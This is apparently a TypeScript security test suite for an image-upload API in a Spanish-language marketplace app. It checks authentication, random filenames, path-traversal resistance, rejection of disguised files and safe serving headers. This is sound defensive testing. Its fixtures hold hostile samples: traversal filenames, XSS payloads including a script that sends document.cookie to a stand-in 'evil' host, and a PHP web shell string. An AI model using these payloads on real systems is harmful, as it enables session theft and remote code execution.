import assert from 'node:assert/strict';
import { mkdtempSync, readdirSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, before, test } from 'node:test';
import { INestApplication } from '@nestjs/common';
import { construirRuc } from '@swapit/shared';
import { cabecerasUploads } from '../../src/common/uploads';
import { reiniciarLimites } from '../../src/common/limite-tasa';
import { LocalStorageDriver, fijarStorage } from '../../src/storage/storage';
import { iniciarDb } from '../db';
import { Cliente, crearApp } from '../http';

let app: INestApplication;
let db: { detener(): Promise<void> };
let base: string;
let c: Cliente;
let dir: string;
let tokenProveedor: string;

const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13]), Buffer.from('IHDR'), Buffer.alloc(60, 7)]);
const JPG = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]), Buffer.alloc(60, 9)]);

const subir = async (ruta: string, nombre: string, datos: Buffer, cookie = c.cookie, tipo = 'image/png') => {
  const fd = new FormData();
  fd.append('file', new Blob([new Uint8Array(datos)], { type: tipo }), nombre);
  const res = await fetch(`${base}/api${ruta}`, { method: 'POST', body: fd, headers: cookie ? { Cookie: cookie } : {} });
  return { status: res.status, data: (await res.json().catch(() => ({}))) as any, headers: res.headers };
};
const archivos = () => readdirSync(dir);

before(async () => {
  db = await iniciarDb(5624);
  dir = mkdtempSync(join(tmpdir(), 'swapit-seg-'));
  fijarStorage(new LocalStorageDriver(dir));
  ({ app, base } = await crearApp());
  c = new Cliente(base);
  const r = await c.post('/auth/registro', { tipo: 'EMPRESA', empresa: { ruc: construirRuc('2093000001'), razonSocial: 'Acopios Subidas SAC', direccion: 'Zona Industrial, Piura', representanteLegal: 'Rep' }, usuario: { nombre: 'Gerente', email: 'up@test.pe', password: 'clave-segura-1' } });
  assert.equal(r.status, 201);
  const p = await c.post('/empresas/proveedores', { razonSocial: 'Proveedor Fotos', direccion: 'Sullana', contactoNombre: 'Pepe' });
  tokenProveedor = p.data.tokenCaptacion;
});
after(async () => {
  fijarStorage(undefined);
  await app.close();
  await db.detener();
});

test('subida: exige sesión', async () => {
  const r = await subir('/uploads', 'a.png', PNG, '');
  assert.equal(r.status, 401);
  assert.equal(archivos().length, 0);
});

test('subida: una imagen válida se guarda con nombre aleatorio y la extensión de su contenido real', async () => {
  const r = await subir('/uploads', 'mi foto.PNG', PNG);
  assert.equal(r.status, 201);
  assert.match(r.data.nombre, /^[0-9a-f]{24}\.png$/);
  assert.ok(r.data.url.endsWith(r.data.nombre));
  assert.deepEqual(readFileSync(join(dir, r.data.nombre)), PNG);
  const otra = await subir('/uploads', 'mi foto.PNG', PNG);
  assert.notEqual(otra.data.nombre, r.data.nombre, 'nombres distintos para el mismo archivo');
  // Un JPG con nombre «.png» se guarda como .jpg: la extensión la decide el contenido, no el cliente.
  const j = await subir('/uploads', 'engaño.png', JPG, c.cookie, 'image/png');
  assert.equal(j.status, 201);
  assert.match(j.data.nombre, /\.jpg$/);
});

test('subida: sin path traversal — el nombre original nunca llega al disco', async () => {
  const antes = archivos().length;
  for (const nombre of ['../../evil.png', '..\\..\\evil.png', '/etc/passwd.png', 'a/b/c.png', 'con%00nulo.png', '....//x.png']) {
    const r = await subir('/uploads', nombre, PNG);
    assert.equal(r.status, 201, nombre);
    assert.match(r.data.nombre, /^[0-9a-f]{24}\.png$/);
  }
  const despues = archivos();
  assert.equal(despues.length, antes + 6);
  assert.ok(despues.every((f) => /^[0-9a-f]{24}\.(png|jpg|webp)$/.test(f)), 'todo lo que hay en la carpeta tiene nombre aleatorio');
});

test('subida: texto renombrado a .png, SVG con script, HTML, GIF, PDF y políglotas se rechazan sin guardar nada', async () => {
  const antes = archivos().length;
  const casos: [string, string, Buffer][] = [
    ['texto renombrado', 'foto.png', Buffer.from('esto es solo texto, no una imagen de verdad. '.repeat(5))],
    ['svg con script (.svg)', 'dibujo.svg', Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>')],
    ['svg con script renombrado a .png', 'dibujo.png', Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(1)</script></svg>')],
    ['html renombrado a .jpg', 'pagina.jpg', Buffer.from('<!doctype html><html><body><script>fetch("//evil/"+document.cookie)</script></body></html>')],
    ['html .html', 'pagina.html', Buffer.from('<html></html>')],
    ['gif renombrado', 'animado.png', Buffer.concat([Buffer.from('GIF89a'), Buffer.alloc(60)])],
    ['pdf renombrado', 'doc.webp', Buffer.concat([Buffer.from('%PDF-1.7\n'), Buffer.alloc(60)])],
    ['ejecutable', 'prog.png', Buffer.concat([Buffer.from('MZ'), Buffer.alloc(60)])],
    ['jpg con script incrustado', 'poli.jpg', Buffer.concat([JPG, Buffer.from('<script>alert(1)</script>')])],
    ['vacío', 'vacio.png', Buffer.alloc(0)],
    ['doble extensión', 'x.php.png', Buffer.from('<?php system($_GET[1]); ?>'.repeat(3))],
  ];
  for (const [nombre, archivo, datos] of casos) {
    const r = await subir('/uploads', archivo, datos);
    assert.ok(r.status === 400, `${nombre}: esperaba 400 y fue ${r.status}`);
  }
  assert.equal(archivos().length, antes, 'no quedó nada en disco');
});

test('subida: más de 5 MB → 413 y nada en disco', async () => {
  const antes = archivos().length;
  const grande = Buffer.concat([PNG, Buffer.alloc(6 * 1024 * 1024)]);
  const r = await subir('/uploads', 'grande.png', grande);
  assert.equal(r.status, 413);
  assert.equal(archivos().length, antes);
});

test('subida: sin archivo o con varios archivos → error 400', async () => {
  const sin = await fetch(`${base}/api/uploads`, { method: 'POST', body: new FormData(), headers: { Cookie: c.cookie } });
  assert.equal(sin.status, 400);
  const fd = new FormData();
  fd.append('file', new Blob([new Uint8Array(PNG)]), 'a.png');
  fd.append('file', new Blob([new Uint8Array(PNG)]), 'b.png');
  const dos = await fetch(`${base}/api/uploads`, { method: 'POST', body: fd, headers: { Cookie: c.cookie } });
  assert.ok(dos.status >= 400 && dos.status < 500);
});

test('captación: la subida con un enlace falso se rechaza ANTES de leer el archivo (no se escribe nada)', async () => {
  reiniciarLimites();
  const antes = archivos().length;
  for (const token of ['token-falso-1234567890', 'x', '..%2F..%2Fetc']) {
    const r = await subir(`/captacion/${token}/fotos`, 'a.png', PNG, '');
    assert.equal(r.status, 404, token);
  }
  assert.equal(archivos().length, antes);
  const ok = await subir(`/captacion/${tokenProveedor}/fotos`, 'a.png', PNG, '');
  assert.equal(ok.status, 201);
  assert.match(ok.data.nombre, /^[0-9a-f]{24}\.png$/);
  const mal = await subir(`/captacion/${tokenProveedor}/fotos`, 'a.png', Buffer.from('no soy una imagen'.repeat(5)), '');
  assert.equal(mal.status, 400);
});

test('captación: el proveedor desactivado no puede subir', async () => {
  const prov = (await c.get('/empresas/proveedores')).data[0];
  await c.patch(`/empresas/proveedores/${prov.id}`, { activo: false });
  assert.equal((await subir(`/captacion/${tokenProveedor}/fotos`, 'a.png', PNG, '')).status, 404);
  await c.patch(`/empresas/proveedores/${prov.id}`, { activo: true });
});

test('referencias a imágenes: solo nombres de archivo simples (sin rutas ni «..»)', async () => {
  const prov = (await c.get('/empresas/proveedores')).data[0];
  const cat = await c.get('/categorias');
  assert.equal(cat.status, 200);
  for (const imagen of ['../../etc/passwd', '..', 'a/b.png', 'http://evil.example/x.png', 'x'.repeat(200), 'a b.png', '<img>']) {
    const r = await c.post('/material', { proveedorId: prov.id, descripcion: 'Botellas PET limpias', cantidad: 10, unidad: 'kg', imagenes: [imagen] });
    assert.equal(r.status, 400, `debería rechazar la imagen «${imagen}»`);
  }
});

test('servir /api/uploads: nosniff siempre; el SVG de demo sale con CSP sin scripts y sandbox', () => {
  const cab: Record<string, string> = {};
  const res = { setHeader: (k: string, v: string) => (cab[k] = v) } as never;
  cabecerasUploads(res, '/ruta/demo-1-1.svg');
  assert.equal(cab['X-Content-Type-Options'], 'nosniff');
  assert.equal(cab['Content-Type'], 'image/svg+xml; charset=utf-8');
  assert.match(cab['Content-Security-Policy'], /default-src 'none'/);
  assert.match(cab['Content-Security-Policy'], /sandbox/);
  assert.ok(!/script-src/.test(cab['Content-Security-Policy']));
  const png: Record<string, string> = {};
  cabecerasUploads({ setHeader: (k: string, v: string) => (png[k] = v) } as never, '/ruta/abc.png');
  assert.equal(png['X-Content-Type-Options'], 'nosniff');
  assert.equal(png['Content-Security-Policy'], undefined);
});
